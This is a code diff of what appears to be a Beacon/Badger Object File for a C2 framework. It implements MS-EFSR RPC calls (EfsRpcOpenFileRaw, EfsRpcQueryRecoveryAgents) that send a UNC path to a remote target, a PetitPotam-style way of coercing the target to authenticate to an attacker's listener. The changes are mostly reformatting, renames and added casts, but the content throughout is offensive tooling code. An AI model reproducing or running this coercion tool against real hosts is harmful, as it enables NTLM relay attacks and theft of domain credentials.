@@ -32,7 +32,7 @@ long EfsRpcOpenFileRaw(
 	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;
 
 	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
-		{
+	{
 		sizeof(RPC_CLIENT_INTERFACE),
 		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
 		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
@@ -42,10 +42,10 @@ long EfsRpcOpenFileRaw(
 		0,
 		0,
 		0x00000001
-		};
+	};
 
-	const MIDL_STUB_DESC efsrpc_StubDesc = 
-		{
+	const MIDL_STUB_DESC efsrpc_lStubDesc = 
+	{
 		(void *)& efsrpc___RpcClientInterface,
 		MIDL_user_allocate,
 		MIDL_user_free,
@@ -66,16 +66,16 @@ long EfsRpcOpenFileRaw(
 		0, /* cs routines */
 		0,   /* proxy/server info */
 		0
-		};
+	};
 
 #if defined(WOW64)
 	_RetVal = RPCRT4$NdrClientCall2(
-		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
+		(PMIDL_STUB_DESC)&efsrpc_lStubDesc,
 		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[0],
 		(unsigned char*)&binding_h);
 #else
 	_RetVal = RPCRT4$NdrClientCall2(
-		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
+		(PMIDL_STUB_DESC)&efsrpc_lStubDesc,
 		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[0],
 		binding_h,
 		hContext,
@@ -86,31 +86,30 @@ long EfsRpcOpenFileRaw(
 	return (long)_RetVal.Simple;
 }
 
-DWORD EfsRpcQueryRecoveryAgents(
-	/* [in] */ handle_t binding_h,
-	/* [string][in] */ wchar_t *FileName,
-	/* [out] */ ENCRYPTION_CERTIFICATE_HASH_LIST **RecoveryAgents)
-{
-
+DWORD EfsRpcQueryRecoveryAgents(handle_t binding_h,	wchar_t *FileName, ENCRYPTION_CERTIFICATE_HASH_LIST **RecoveryAgents) {
 	CLIENT_CALL_RETURN _RetVal;
 	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;
 
-	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
-		{
+	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface = {
 		sizeof(RPC_CLIENT_INTERFACE),
-		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
-		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
-		0,
-		0,
-		0,
-		0,
-		0,
-		0x00000001
-		};
+		{   /* InterfaceId */
+			{ 0xc681d488, 0xd850, 0x11d0, { 0x8c, 0x52, 0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e } },
+			{ 1, 0 }
+		},
+		{   /* TransferSyntax */
+			{ 0x8A885D04, 0x1CEB, 0x11C9, { 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60 } },
+			{ 2, 0 }
+		},
+		0, /* Flags */
+		0, /* RpcProtseqEndpointCount */
+		0, /* RpcProtseqEndpoint */
+		0, /* Reserved */
+		0, /* ManagerEPV */
+		0x00000001 /* InterpreterInfo */
+	};
 
-	const MIDL_STUB_DESC efsrpc_StubDesc = 
-		{
-		(void *)& efsrpc___RpcClientInterface,
+	const MIDL_STUB_DESC efsrpc_lStubDesc =	{
+		(void *)&efsrpc___RpcClientInterface,
 		MIDL_user_allocate,
 		MIDL_user_free,
 		&efsrpc__MIDL_AutoBindHandle,
@@ -119,27 +118,27 @@ DWORD EfsRpcQueryRecoveryAgents(
 		0,
 		0,
 		ms2Defsrpc__MIDL_TypeFormatString.Format,
-		1, /* -error bounds_check flag */
-		0x50002, /* Ndr library version */
+		1,
+		0x50002,
 		0,
-		0x801026e, /* MIDL Version 8.1.622 */
+		0x801026e,
 		0,
 		0,
-		0,  /* notify & notify_flag routine table */
-		0x1, /* MIDL flag */
-		0, /* cs routines */
-		0,   /* proxy/server info */
+		0,
+		0x1,
+		0,
+		0,
 		0
-		};
+	};
 
 #if defined(WOW64)
 	_RetVal = RPCRT4$NdrClientCall2(
-		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
+		(PMIDL_STUB_DESC)&efsrpc_lStubDesc,
 		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[316],
 		(unsigned char*)&binding_h);
 #else
 	_RetVal = RPCRT4$NdrClientCall2(
-		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
+		(PMIDL_STUB_DESC)&efsrpc_lStubDesc,
 		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[330],
 		binding_h,
 		FileName,
@@ -155,7 +154,7 @@ RPC_STATUS CreateBindingHandle(_In_ LPWSTR lpwTarget, _Out_ RPC_BINDING_HANDLE* 
 	RPC_SECURITY_QOS SecurityQOS = { 0 };
 	RPC_WSTR StringBinding = NULL;
 	RPC_BINDING_HANDLE Binding;
-	SEC_WINNT_AUTH_IDENTITY AuthIdentity = { 0 };
+	
 
 	StringBinding = 0;
 	Binding = 0;
@@ -200,7 +199,7 @@ LPWSTR ConvertToWideChar(const char* input) {
 		return NULL;
 	}
 
-	LPWSTR wideStr = (LPWSTR)BadgerAlloc(size * sizeof(WCHAR));
+	LPWSTR wideStr = (LPWSTR)BadgerAlloc((DWORD)size*sizeof(WCHAR));
 	if (!wideStr) {
 		return NULL;
 	}
@@ -223,13 +222,11 @@ void coffee( char ** argv, int argc, WCHAR** dispatch) {
 	g_dispatch = dispatch;
 
 	HRESULT hr = S_OK;
-	CLIENT_CALL_RETURN _RetVal;
 	LPWSTR lpwListener = NULL;
 	LPWSTR lpwTarget = NULL;
 	WCHAR wcRPCTarget[BUF_SIZE] = L"\\\\";
 	WCHAR wcFileName[BUF_SIZE] = { 0 };
 	LONG lFlag = 0;
-	int size = 0;
 
 	RPC_BINDING_HANDLE bHandle;
 	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;
@@ -272,7 +269,7 @@ void coffee( char ** argv, int argc, WCHAR** dispatch) {
 
 	hr = EfsRpcOpenFileRaw(bHandle, &pContextHandle, wcFileName, lFlag);
 	if (hr != ERROR_BAD_NETPATH) {
-		hr = EfsRpcQueryRecoveryAgents(bHandle, wcFileName, &pEncCertHashList);
+		hr = (HRESULT) EfsRpcQueryRecoveryAgents(bHandle, wcFileName, &pEncCertHashList);
 	}
 
 	if (hr != ERROR_BAD_NETPATH) {
